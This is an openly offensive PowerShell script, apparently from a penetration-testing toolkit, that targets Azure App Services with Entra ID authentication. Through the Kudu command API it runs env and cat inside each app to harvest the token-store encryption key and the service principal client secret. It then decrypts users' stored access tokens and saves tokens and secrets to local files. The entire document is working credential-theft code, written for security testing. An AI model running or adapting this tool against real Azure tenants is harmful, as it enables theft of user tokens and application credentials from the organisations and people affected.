<#
    File: Get-AzWebAppTokens.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2025
    Description: PowerShell function for extracting credentials from Azure App Services applications that have integrated Entra ID authentication.
    Original Research: Abusing Delegated Permissions via Easy Auth by Cody Burkard - https://dazesecurity.io/blog/abusingEasyAuth
#>

function Get-AzWebAppTokens {
<#
.SYNOPSIS
    Finds App Services with integrated Entra ID authentication enabled, and uses the Kudu API to run commands in the application and extract/decrypt tokens and App Registration credentials.
.DESCRIPTION
    This function identifies Azure App Services within the current subscription that have integrated Entra ID authentication configured. 
    It prompts the user to select one or more of these applications via Out-GridView. For each selected application, it leverages the Kudu run command API to execute commands on the App Service container. 

    The script also retrieves service principal credentials and the WEBSITE_AUTH_ENCRYPTION_KEY for decryption. It functions with both Windows and Linux-based App Services applications,
    locating the token stores at either C:\home\data\.auth\tokens or /home/data/.auth/tokens respectively.

    The function outputs the service principal credentials to a local file (ServicePrincipals.txt) and writes the decrypted tokens to a local file named APPNAME-tokens.txt.
.PARAMETER Subscription
    Subscription to use.
.EXAMPLE
    Get-AzWebAppTokens -Verbose
    VERBOSE: Logged In as kfosaaen@notatenant.com
    VERBOSE: Enumerating Azure App Services Applications in the "TestEnvironment" Subscription
    VERBOSE: 	Filtering for Applications with the Microsoft Identity Provider
    VERBOSE: 		Found Microsoft Identity Provider on TestEnvironmentApplication
    VERBOSE: 		Found Microsoft Identity Provider on extractiontest
    VERBOSE: 	2 potentially vulnerable applications identified
    VERBOSE: 	Targeting the TestEnvironmentApplication application
    VERBOSE: 		Reading token files from: /home/data/.auth/tokens
    VERBOSE: 			Found 4 JSON files
    VERBOSE: 				Decrypted token for Karl Fosaaen
    VERBOSE: 				Decrypted token for Thomas Elling
    VERBOSE: 				Decrypted token for Scott Sutherland
    VERBOSE: 				Decrypted token for Eric Gruber
    VERBOSE: 			Application tokens written to TestEnvironmentApplication-tokens.txt
    VERBOSE: 	Completed extraction on the TestEnvironmentApplication application
    VERBOSE: 	Targeting the extractiontest application
    VERBOSE: 		Reading token files from: C:\home\data\.auth\tokens
    VERBOSE: 			Found 2 JSON files
    VERBOSE: 				Decrypted token for Karl Fosaaen
    VERBOSE: 				Decrypted token for Joshua Murrell
    VERBOSE: 			Application tokens written to extractiontest-tokens.txt
    VERBOSE: 	Completed extraction on the extractiontest application
    VERBOSE: Application credentials appended to ServicePrincipals.txt file
    VERBOSE: Completed credential collection against selected apps in the "TestEnvironment" Subscription
.LINK
    https://dazesecurity.io/blog/abusingEasyAuth
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = ""
    )

    # Supresses the status/progress bars
    $ProgressPreference = 'SilentlyContinue'

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
   
    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        Write-Verbose "Logged In as $accountName"
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzWebAppTokens -Subscription $sub}
        return
    }

    $SubInfo = Get-AzSubscription -SubscriptionId $Subscription

    # Helper function to fix base64 padding
    function Fix-Base64Padding {
        param([string]$Base64String)
        
        if ([string]::IsNullOrEmpty($Base64String)) { return $Base64String }
        
        # Remove any existing padding and whitespace
        $cleanString = $Base64String.Trim().TrimEnd('=')
        
        # Handle URL-safe base64
        $cleanString = $cleanString.Replace('-', '+').Replace('_', '/')
        
        # Remove any non-base64 characters except valid ones
        $cleanString = $cleanString -replace '[^A-Za-z0-9+/]', ''
        
        # Calculate how many padding characters we need
        $paddingNeeded = (4 - ($cleanString.Length % 4)) % 4
        
        # Add the padding
        return $cleanString + ('=' * $paddingNeeded)
    }

    # Helper function to decrypt the token
    function Decrypt-Token {
        param(
            [string]$EncryptedToken,
            [string]$EncryptionKey
        )

        try {
            # Fix base64 padding issues
            $fixedToken = Fix-Base64Padding $EncryptedToken
            
            # Decode the base64 to get binary data
            $encryptedBytes = [System.Convert]::FromBase64String($fixedToken)

            if ($encryptedBytes.Length -lt 16) {
                Write-Warning "Encrypted data too short (less than 16 bytes for IV)"
                return $null
            }

            $iv = $encryptedBytes[0..15]
            $cipherText = $encryptedBytes[16..($encryptedBytes.Length - 1)]
            
            $keyBytes = $null
            
            if ($EncryptionKey.Length -eq 64 -and $EncryptionKey -match '^[0-9A-Fa-f]+$') {
                $keyBytes = [byte[]]::new(32)
                for ($i = 0; $i -lt 32; $i++) {
                    $keyBytes[$i] = [Convert]::ToByte($EncryptionKey.Substring($i * 2, 2), 16)
                }
            }

            # Set up AES parameters
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.KeySize = 256
            $aes.BlockSize = 128
            $aes.Key = $keyBytes
            $aes.IV = $iv

            $decryptor = $aes.CreateDecryptor()
            $plainTextBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
            $plainText = [System.Text.Encoding]::UTF8.GetString($plainTextBytes)

            $aes.Dispose()
            return $plainText
        }
        catch {
            Write-Warning "Failed to decrypt token: $_"
            return $null
        }
    }

    # Get access token for Azure Management API
    try {
        $mgmtAccessToken = Get-AzAccessToken -ResourceUrl "https://management.azure.com/"
        if ($mgmtAccessToken.Token -is [System.Security.SecureString]) {
            $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($mgmtAccessToken.Token)
            try {
                $mgmtToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
            } finally {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
            }
        } else {
            $mgmtToken = $mgmtAccessToken.Token
        }
    }
    catch {
        Write-Error "Could not get access token. Please ensure you are logged in via Connect-AzAccount. Error: $_"
        return
    }

    $mgmtHeaders = @{ Authorization = "Bearer $mgmtToken" }

    # Results table to store extracted credentials
    $results = @()

    # Find web apps with a Microsoft Identity Provider
    Write-Verbose "Enumerating Azure App Services Applications in the `"$($SubInfo.Name)`" Subscription"
    Write-Verbose "`tFiltering for Applications with the Microsoft Identity Provider"

    $allWebApps = Get-AzWebApp
    $webApps = @()
    foreach ($app in $allWebApps) {
        try {
            $apiUrl = "https://management.azure.com$($app.Id)/Config/authsettings/list?api-version=2016-03-01"
            $appConfig = (Invoke-WebRequest -Verbose:$false -Method Post -Uri $apiUrl -Headers $mgmtHeaders).Content | ConvertFrom-Json

            if (-not [string]::IsNullOrEmpty($appConfig.properties.clientId)) {
                Write-Verbose "`t`tFound Microsoft Identity Provider on $($app.Name)"
                $webApps += $app
            }
        }
        catch {
             Write-Verbose "Error checking $($app.Name): $_"
        }
    }

    if (-not $webApps) {
        Write-Output "No App Services with Microsoft Identity Provider found in the `"$($SubInfo.Name)`" Subscription`n"
        return
    }
    else{Write-Verbose "`t$($webApps.Count) potentially vulnerable applications identified"}

    # Prompt user to select apps, showing only relevant columns
    $selection = $webApps | Select-Object Name, ResourceGroup, Location, Kind | Out-GridView -PassThru -Title "Select App Services to target"

    if (-not $selection) {
        Write-Output "No applications selected."
        return
    }
    
    # Get the full webapp objects for the selection
    $selectedApps = $webApps | Where-Object { $_.Name -in $selection.Name }

    foreach ($app in $selectedApps) {

        Write-Verbose "`tTargeting the $($app.Name) application"

        $kuduApiUrl = "https://$($app.EnabledHostNames | Where-Object {$_ -like "*.scm.*"})"
        $kuduHeaders = @{
            Authorization = "Bearer $mgmtToken"
        }

        # Determine OS and token path
        $isLinuxApp = $app.Kind -like "*linux*"
        $tokenStorePath = if ($isLinuxApp) { "/home/data/.auth/tokens" } else { "C:\home\data\.auth\tokens" }
        
        # Commands to list and read token files
        if ($isLinuxApp) {
            $listCommand = "ls -la $tokenStorePath"
            $readCommand = "cat $tokenStorePath/*.json"
        } else {
            $listCommand = "powershell -c `"Get-ChildItem -Path `"$tokenStorePath`" -Name`""
            $readCommand = "powershell -c `"Get-Content -Path `"$tokenStorePath\*.json`" -Raw`""
        }

        # Kudu API command execution endpoint
        $commandApiUrl = "$kuduApiUrl/api/command"

        try {
            # Get environment variables to find the decryption key and SP credentials
            $envCommand = if ($isLinuxApp) { "env" } else { "cmd /c set" }
            $envResponse = Invoke-RestMethod -Verbose:$false -Uri $commandApiUrl -Headers $kuduHeaders -Method Post -Body (@{ command = $envCommand } | ConvertTo-Json) -ContentType "application/json"
            
            $encryptionKey = ($envResponse.Output -split '\n' | Where-Object { $_ -match "WEBSITE_AUTH_ENCRYPTION_KEY" }).Split('=')[1].Trim()
            
            # Parse the specific credential values
            $envLines = $envResponse.Output -split '\n'

            $clientId = ($envLines | Where-Object { $_ -match "^(WEBSITE_AUTH_CLIENT_ID|APPSETTING_WEBSITE_AUTH_CLIENT_ID)=" } | Select-Object -First 1).Split('=')[1]
            $clientSecret = ($envLines | Where-Object { $_ -match "^(APPSETTING_MICROSOFT_PROVIDER_AUTHENTICATION_SECRET|AUTH_CLIENT_SECRET)=" } | Select-Object -First 1).Split('=')[1]
            $issuerUrl = ($envLines | Where-Object { $_ -match "^(WEBSITE_AUTH_OPENID_ISSUER|APPSETTING_WEBSITE_AUTH_OPENID_ISSUER)=" } | Select-Object -First 1).Split('=')[1]

            
            # Extract tenant ID from issuer URL
            $tenantId = if ($issuerUrl -match "([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})") { $matches[1] } else { "Not Found" }
            
            # Add to results table
            $results += [PSCustomObject]@{
                AppName = $app.Name
                ResourceGroup = $app.ResourceGroup
                ClientId = $clientId
                TenantId = $tenantId
                ClientSecret = $clientSecret
            }
            
            # Get the token store content by reading all JSON files
            Write-Verbose "`t`tReading token files from: $tokenStorePath"
            
            # Clear jsonFiles and tokenStoreResponse variables - Covers multiple app loops
            $jsonFiles = $null
            $tokenStoreResponse = @{ Output = $null }

            # Try reading files individually by getting the file list first
            if ([string]::IsNullOrEmpty($tokenStoreResponse.Output)) {
                
                $listResponse = Invoke-RestMethod -Verbose:$false -Uri $commandApiUrl -Headers $kuduHeaders -Method Post -Body (@{ command = $listCommand } | ConvertTo-Json) -ContentType "application/json"
                
                # Extract JSON filenames from the listing - handle both Windows and Linux formats
                if ($isLinuxApp) {
                    $jsonFiles = ($listResponse.Output -split '\n' | Where-Object { $_ -match '\.json$' } | ForEach-Object { 
                        if ($_ -match '\s+([a-f0-9]+\.json)') { $matches[1] }
                    })
                }
                else{
                    $jsonFiles = $listResponse.Output -split '\n' | Where-Object { $_ -ne "" }
                }
                
                if ($jsonFiles) {
                    Write-Verbose "`t`t`tFound $($jsonFiles.Count) JSON files"
                    $allTokenContent = ""
                    foreach ($fileName in $jsonFiles) {
                        $fileCommand = if ($isLinuxApp) { "cat $tokenStorePath/$fileName" } else { "powershell -c `"Get-Content -Path `"$tokenStorePath\$fileName`" -Raw`"" }
                        $fileResponse = Invoke-RestMethod -Verbose:$false -Uri $commandApiUrl -Headers $kuduHeaders -Method Post -Body (@{ command = $fileCommand } | ConvertTo-Json) -ContentType "application/json"
                        $allTokenContent += $fileResponse.Output
                    }
                    $tokenStoreResponse = @{ Output = $allTokenContent }
                } else {
                    Write-Warning "`t`tNo token files found in $tokenStorePath"
                    continue
                }
            }

            # Process each individual token file and attempt decryption
            $decryptedTokens = @()
            foreach ($fileName in $jsonFiles) {
                $fileCommand = if ($isLinuxApp) { "cat $tokenStorePath/$fileName" } else { "powershell -c `"Get-Content -Path `"$tokenStorePath\$fileName`" -Raw`"" }
                $fileResponse = Invoke-RestMethod -Verbose:$false -Uri $commandApiUrl -Headers $kuduHeaders -Method Post -Body (@{ command = $fileCommand } | ConvertTo-Json) -ContentType "application/json"
                
                try {
                    $tokenContent = $fileResponse.Output.Trim()
                    
                    # Clean up escaped characters that might interfere with base64 decoding
                    $cleanedContent = $tokenContent -replace '\\\/', '/'
                    $tokenData = $cleanedContent | ConvertFrom-Json
                    
                    # Check if this file has encrypted tokens
                    if ($tokenData.encrypted -eq $true -and $tokenData.tokens) {

                        # Process each token within the tokens object
                        foreach ($tokenProperty in $tokenData.tokens.PSObject.Properties) {
                            
                            # Clean the base64 string of any remaining escaped characters
                            $cleanBase64 = $tokenProperty.Value -replace '\\\/', '/'
                            
                            $decrypted = Decrypt-Token -EncryptedToken $cleanBase64 -EncryptionKey $encryptionKey
                            if ($decrypted) {
                                $decryptedTokens += "$decrypted"
                                $userDecrypted = ($decrypted | ConvertFrom-Json).user_id
                                Write-Verbose "`t`t`t`tDecrypted token for $userDecrypted"
                            } 
                            else {
                                Write-Verbose "`t`t`tFailed to decrypt token: $($tokenProperty.Name) from $fileName"
                            }
                        }
                    } 
                    else {
                        Write-Verbose "`t`tSkipping $fileName - not encrypted or no tokens object found"
                    }
                }
                catch {
                    Write-Verbose "`t`tFailed to process token file $fileName : $($_.Exception.Message)"
                }
            }

            if ($decryptedTokens) {
                $decryptedTokens | Out-File -FilePath "$(-join($app.Name,"-tokens.txt"))" -Append
                Write-Verbose "`t`t`tApplication tokens written to $(-join($app.Name,"-tokens.txt"))"
            } 
            else {
                Write-Warning "`tNo tokens were successfully decrypted for $($app.Name)"
            }
        }
        catch {
            Write-Error "An error occurred while processing $($app.Name): $_"
        }
        Write-Verbose "`tCompleted extraction on the $($app.Name) application"
    }

    
    # Output results table to file
    if ($results) {
        $results | Out-File -FilePath "ServicePrincipals.txt" -Append
        Write-Verbose "Application credentials appended to ServicePrincipals.txt"
    }

    Write-Verbose "Completed credential collection against selected apps in the `"$($SubInfo.Name)`" Subscription`n"
} 